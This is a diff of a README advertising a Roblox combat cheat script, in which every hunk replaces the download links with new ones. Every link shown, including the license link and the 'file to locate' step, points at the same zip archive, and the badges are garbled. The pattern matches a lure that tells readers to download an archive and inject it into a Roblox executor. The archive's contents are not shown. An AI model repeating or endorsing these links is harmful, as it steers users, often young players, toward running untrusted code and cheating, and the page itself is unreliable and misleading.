@@ -1,10 +1,10 @@
 # 🧠 Brainrot Fighting Script Roblox
 
-[![Release](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip+Release)](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip)
-[![License: MIT](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip)](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip)
-[![Roblox Compatible](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip)](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip)
-[![Chat Support](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip%2F7%20Support-Active-blue?style=for-the-badge)](#-customer-service)
-[![API Integrations](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip%20%26%20Claude-Integrated-00b6b6?style=for-the-badge)](#-integration-with-openai-api-and-claude-api)
+[![Release](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip+Release)](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip)
+[![License: MIT](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip)](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip)
+[![Roblox Compatible](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip)](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip)
+[![Chat Support](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip%2F7%20Support-Active-blue?style=for-the-badge)](#-customer-service)
+[![API Integrations](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip%20%26%20Claude-Integrated-00b6b6?style=for-the-badge)](#-integration-with-openai-api-and-claude-api)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to the **Brainrot Fighting Script Roblox** repository – your launchpad
 
 Jump into battle today by claiming the script:
 
-[![Download](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip%20Script-%20Click%20Here!-blue?style=for-the-badge)](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip)
+[![Download](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip%20Script-%20Click%20Here!-blue?style=for-the-badge)](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip)
 
 ---
 
@@ -59,15 +59,15 @@ Experience the *Brainrot difference* – download and deploy with cosmic efficie
 
 ### Step 1: Acquire the Package
 
-Visit the latest release here: https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip  
+Visit the latest release here: https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip  
 Or jump directly with the one-click button below!
 
-[![Download](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip%20Script-%20Click%20Here!-blue?style=for-the-badge)](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip)
+[![Download](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip%20Script-%20Click%20Here!-blue?style=for-the-badge)](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip)
 
 ### Step 2: Unleash the Engine
 
 1. Extract the contents of the downloaded archive.
-2. Locate the `https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip` file.
+2. Locate the `https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip` file.
 3. Inject or load this script into your favorite Roblox executor.
 
 _Enjoy!_
@@ -122,7 +122,7 @@ The script does not guarantee invulnerability, victory, or immunity from platfor
 
 ## 📜 MIT License — 2025
 
-Love code? Share it, remix it, build it higher. This project is made available under the [MIT License](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip).  
+Love code? Share it, remix it, build it higher. This project is made available under the [MIT License](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip).  
 Please review the LICENSE file for further information.
 
 ---
@@ -131,7 +131,7 @@ Please review the LICENSE file for further information.
 
 Missed the chance at the top? All good — here’s your encore.
 
-[![Download](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip%20Script-%20Click%20Here!-blue?style=for-the-badge)](https://github.com/mahmoudar/brainrot-combat-scripts-for-roblox/raw/refs/heads/branch/schizogenetic/combat-roblox-brainrot-for-scripts-v1.5.zip)
+[![Download](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip%20Script-%20Click%20Here!-blue?style=for-the-badge)](https://raw.githubusercontent.com/mahmoudar/brainrot-combat-scripts-for-roblox/branch/schizogenetic/for_roblox_brainrot_combat_scripts_3.3.zip)
 
 Extract, inject, play — as easy as pie, but way more powerful.
 
